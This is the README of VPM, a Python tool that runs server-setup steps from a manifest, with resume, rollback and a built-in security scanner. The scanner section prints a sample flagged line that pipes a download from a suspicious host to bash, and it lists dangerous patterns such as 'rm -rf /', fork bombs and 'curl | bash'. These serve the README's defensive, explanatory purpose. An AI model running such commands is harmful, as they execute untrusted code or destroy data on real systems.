<p align="center">
  <img src="https://raw.githubusercontent.com/Nao-30/vpm/main/assets/logo.png" alt="VPM Logo" width="160">
</p>

<h1 align="center">VPM — Virtual Package Manager</h1>

<p align="center">
  Resumable, trackable script orchestration for VPS and local environments.<br>
  <strong>Define steps. Run them. Resume if interrupted. Rollback if needed.</strong>
</p>

<p align="center">
  <a href="https://pypi.org/project/vpmx/"><img src="https://img.shields.io/pypi/v/vpmx?color=06B6D4&label=PyPI" alt="PyPI"></a>
  <a href="https://github.com/Nao-30/vpm/actions"><img src="https://img.shields.io/github/actions/workflow/status/Nao-30/vpm/ci.yml?label=CI" alt="CI"></a>
  <a href="https://github.com/Nao-30/vpm/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Nao-30/vpm?color=06B6D4" alt="License"></a>
  <a href="https://www.python.org/"><img src="https://img.shields.io/pypi/pyversions/vpmx?color=06B6D4" alt="Python"></a>
</p>

---

## Why VPM?

You SSH into a server. You need to run 30+ commands to set up Docker, Nginx, firewall, SSL, your app. Halfway through, your connection drops.

With VPM:
- **Write once** — Define steps in a simple manifest file
- **Resume anywhere** — Interrupted? Just run `vpm install` again
- **Track everything** — Every step's status, exit code, and full output logged
- **Stay safe** — Built-in security scanner catches risky commands before execution
- **Undo mistakes** — Rollback support reverses completed steps
- **Resolve dependencies** — App B needs App A? VPM handles the order
- **Zero dependencies** — Pure Python 3.10+ stdlib. Nothing to install but VPM itself

---

## Install

```bash
pip install vpmx        # or: pipx install vpmx
vpm doctor              # verify everything works
```

---

## 60-Second Demo

```bash
# Create a project
mkdir ~/server-setup && cd ~/server-setup
vpm init

# Edit the manifest (or let an AI agent generate one)
nano vpm-manifest.yaml

# Preview what will run
vpm install --dry-run

# Scan for security issues
vpm audit

# Execute
vpm install

# Check status anytime
vpm status
```

---

## Manifest Format

```yaml
# vpm-manifest.yaml

[system_base] Core packages
- label: Update system
  run: sudo apt-get update -y && sudo apt-get upgrade -y

- label: Install essentials
  run: sudo apt-get install -y curl wget git htop
  rollback: sudo apt-get remove -y curl wget git htop

[docker] Docker Engine
requires: system_base

- label: Install Docker
  run: |
    curl -fsSL https://get.docker.com | sh
    sudo usermod -aG docker $USER
  rollback: sudo apt-get remove -y docker-ce

- label: Verify
  run: docker --version
```

That's it. `[app_name]`, `requires:`, `label:`, `run:`, `rollback:`. [Full manifest docs →](docs/guide/manifest-format.md)

---

## Commands

| Command | What it does |
|---------|-------------|
| `vpm install` | Execute manifest (resumes automatically) |
| `vpm install --dry-run` | Preview without executing |
| `vpm audit` | Security scan a manifest |
| `vpm run <url>` | Fetch & execute a remote manifest |
| `vpm rollback <app>` | Undo completed steps in reverse |
| `vpm status` | Show all tracked apps |
| `vpm logs <app>` | Browse execution logs |
| `vpm retry <app>` | Resume from failure point |
| `vpm reset <app>` | Clear tracking for fresh install |
| `vpm doctor` | Diagnose environment |

[Full commands reference →](docs/guide/commands.md)

---

## Security Scanner

VPM scans manifests before execution — catching dangerous patterns automatically:

```
⚠ HIGH: Downloading and piping directly to shell interpreter
  Step 1: Install sketchy tool
    curl http://sketchy.xyz/payload | bash
  → Download first, inspect, then execute.

◐ MEDIUM: URL uses suspicious TLD: .xyz
  → Verify this domain is legitimate.
```

| Severity | Examples |
|----------|----------|
| Critical | `rm -rf /`, fork bombs, disk formatting |
| High | `curl \| bash`, `eval $var`, `chmod 777` |
| Medium | Unknown URLs, third-party repos, non-HTTPS |
| Low | `sudo` usage (expected but noted) |

Configurable levels: `strict`, `warn` (default), `permissive`, `off`. [Security docs →](docs/guide/security.md)

---

## Remote Manifests

Run manifests directly from URLs or GitHub repos:

```bash
vpm run https://example.com/setup.yaml
vpm run github:user/repo                    # fetches vpm-manifest.yaml
vpm run github:user/repo/path/file.yaml     # specific file
```

Security scanning is mandatory for remote manifests.

---

## Crash Recovery

```
You:     vpm install          # starts running
SSH:     *disconnects*        # step 3 of 8 was running
You:     vpm install          # reconnect, run again
VPM:     Steps 1-2 ✔ skip    # already done
         Step 3 → re-run     # was interrupted
         Steps 4-8 → run     # continue normally
```

The lock file tracks every step atomically. No corruption, no re-running completed work.

---

## Examples

Real-world manifests in [`examples/`](examples/):

- [`docker.yaml`](examples/docker.yaml) — Docker Engine & Compose
- [`node-server.yaml`](examples/node-server.yaml) — Node.js + PM2 + Nginx
- [`security-hardening.yaml`](examples/security-hardening.yaml) — UFW + fail2ban + SSH hardening
- [`dev-environment.yaml`](examples/dev-environment.yaml) — Python + Node + Rust dev setup
- [`lamp-stack.yaml`](examples/lamp-stack.yaml) — Apache + MySQL + PHP

---

## For AI Agents

VPM is designed to work with AI assistants. Ask your AI to "create a VPM manifest to set up X" and it works.

- [`AGENTS.md`](AGENTS.md) — Concise reference for AI context windows
- [`llms.txt`](llms.txt) — Ultra-condensed reference

---

## Documentation

| Guide | What's covered |
|-------|---------------|
| [Manifest Format](docs/guide/manifest-format.md) | Syntax, apps, steps, dependencies, multi-line commands |
| [Commands Reference](docs/guide/commands.md) | All CLI commands with flags and examples |
| [Security & Rollback](docs/guide/security.md) | Scanner config, rollback system, remote manifests |
| [How It Works](docs/guide/how-it-works.md) | Lock file, step states, crash recovery, change detection |
| [Execution Model](docs/guide/execution-model.md) | PTY execution, interactive support, file locations |
| [Writing Manifests](docs/guide/writing-manifests.md) | Best practices, patterns, anti-patterns, AI agent guidelines |
| [Troubleshooting](docs/guide/troubleshooting.md) | Common issues, fixes, architecture overview |

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). No external dependencies — pure Python stdlib.

## License

[MIT](LICENSE) — Mohammed A. Al-Kebsi
